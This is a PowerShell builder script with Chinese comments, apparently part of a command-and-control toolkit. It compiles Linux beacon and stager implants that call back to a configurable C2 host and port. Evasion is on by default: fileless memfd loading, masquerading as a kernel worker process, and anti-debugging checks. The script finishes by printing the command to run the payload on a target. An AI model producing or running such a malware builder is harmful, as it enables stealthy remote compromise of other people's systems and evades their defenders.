<#
  cs_dev :: gen_linux.ps1  --  Linux 载荷生成器
  -----------------------------------------------------------------------
  流程: 写入编译期配置 -> 通过 WSL gcc 交叉/原生编译 -> 加壳与符号处理 -> 输出

  用法:
    .\gen_linux.ps1 -Type beacon -C2Host 10.0.0.1 -Port 8443 -OutName payload.elf
    .\gen_linux.ps1 -Type stager -C2Host 10.0.0.1 -Port 8443 -OutName loader.elf -Dynamic
    .\gen_linux.ps1 -Type beacon -C2Host 10.0.0.1 -Port 8443 -OutName p.elf -OutDir D:\out
#>
[CmdletBinding()]
param(
    [ValidateSet('beacon','stager')] [string] $Type   = 'beacon',
    [string] $C2Host    = '127.0.0.1',
    [int]    $Port      = 8443,
    [string] $OutName   = 'payload.elf',
    [string] $OutDir    = '',       # 输出目录 (留空 = cs_dev/build/linux)
    [switch] $Dynamic,              # 动态链接 (体积小, 依赖目标 libc)
    [switch] $NoStrip,
    # ---- 免杀开关 (生成时选择, 每次重新编译, 即时生效) ----
    [switch] $NoMemfd,              # 禁用 memfd 无文件加载, 回退 /dev/shm
    [switch] $NoMaskName,           # 禁用进程名伪装 (不伪装成 [kworker/0:2])
    [switch] $NoAntiDebug,          # 关闭反调试 (TracerPid 检测 + PR_SET_DUMPABLE)
    [string[]] $Defines = @()       # 额外编译宏
)

$ErrorActionPreference = 'Stop'
$DevRoot   = Split-Path -Parent $PSScriptRoot
$LinuxDir  = Join-Path $DevRoot 'linux'
if (-not $OutDir) { $OutDir = Join-Path $DevRoot 'build\linux' }
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

function Say($m, $c='Gray') { Write-Host $m -ForegroundColor $c }

# --- WSL 可用性检查 -------------------------------------------------------
$wslOk = $true
try { $null = & wsl.exe -e bash -c "echo ok" 2>$null } catch { $wslOk = $false }
if (-not $wslOk) { throw "WSL unavailable, cannot build ELF" }

# --- 路径映射 D:\ -> /mnt/d/ ---------------------------------------------
function To-WslPath($p) {
    $d = $p.Substring(0,1).ToLower()
    $rest = $p.Substring(2).Replace('\','/')
    return "/mnt/$d$rest"
}
$wslLinux = To-WslPath $LinuxDir
$wslOut   = To-WslPath $OutDir

# --- 编译 ----------------------------------------------------------------
$flags = @('-O2','-fno-ident','-fno-asynchronous-unwind-tables','-fno-stack-protector')
if (-not $NoStrip) { $flags += '-s' }
if ($Dynamic)      { $flags += '-Os' } else { $flags += '-static' }

$cflags = "-DC2_HOST='`"$C2Host`"' -DC2_PORT=$Port"

# 免杀开关 -> 编译宏
$harden = @()
if ($NoMemfd)     { $harden += '-DCS_DEV_NO_MEMFD' }
if ($NoMaskName)  { $harden += '-DCS_DEV_NO_MASKNAME' }
if ($NoAntiDebug) { $harden += '-DCS_DEV_NO_ANTIDEBUG' }
foreach ($x in $Defines) { $harden += "-D$x" }
$hardenStr = $harden -join ' '

$cmd = "cd '$wslLinux' && gcc $($flags -join ' ') $cflags $hardenStr -o '$wslOut/$OutName' $Type.c"

Say "[*] compiling $Type  (C2 = ${C2Host}:${Port})" 'Cyan'
if ($harden.Count -gt 0) { Say "    hardening: $hardenStr" 'DarkGray' }
Say "    $cmd" 'DarkGray'

$build = & wsl.exe -e bash -c "$cmd 2>&1" 2>&1
# 静态链接下 gethostbyname 的版本警告与其上下文前缀行无实际意义, 一并滤掉
$build | Where-Object { $_ -notmatch 'gethostbyname|in function|^$' } | ForEach-Object { Say "    $_" 'DarkGray' }

$outPath = Join-Path $OutDir $OutName
if (-not (Test-Path $outPath)) { throw "build failed, no output:  $outPath" }

# --- 后处理: 校验 + 加固 --------------------------------------------------
$bytes = [System.IO.File]::ReadAllBytes($outPath)
$isElf = ($bytes[0] -eq 0x7f -and $bytes[1] -eq 0x45 -and $bytes[2] -eq 0x4c -and $bytes[3] -eq 0x46)
$sz    = [math]::Round((Get-Item $outPath).Length / 1KB, 1)

Say "" 
Say "[+] generated" 'Green'
Say "    path : $outPath"
Say "    size : $sz KB"
Say "    format : $(if($isElf){'ELF'}else{'unknown'})"
Say "    link : $(if($Dynamic){'dynamic (needs libc)'}else{'static (self-contained)'})"
Say "    harden: memfd=$(if($NoMemfd){'off'}else{'on'})  maskname=$(if($NoMaskName){'off'}else{'on'})  antidbg=$(if($NoAntiDebug){'off'}else{'on'})"
Say ""
Say "run on target:" 'White'
Say "    chmod +x $OutName && ./$OutName" 'White'
